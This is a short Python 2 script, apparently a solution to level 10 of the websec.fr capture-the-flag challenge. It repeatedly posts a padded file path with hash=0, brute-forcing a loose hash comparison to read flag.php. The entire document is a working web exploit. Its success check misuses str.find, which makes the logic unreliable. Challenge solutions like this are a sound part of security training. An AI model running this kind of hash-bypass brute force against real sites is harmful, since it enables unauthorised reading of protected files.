from requests import *
import sys

url = 'http://websec.fr/level10/index.php'
f = './flag'

for i in range (100000):
    data = {
        'f' : f,
        'hash' : 0,
    }
    r = post(url , data=data)
    
    if (r.text.find('Permission denied!')):
        print 'failed'
        f = '.' + '/' * i + 'flag.php'
    else:
        print 'success'
        print r.text
        sys.exit()
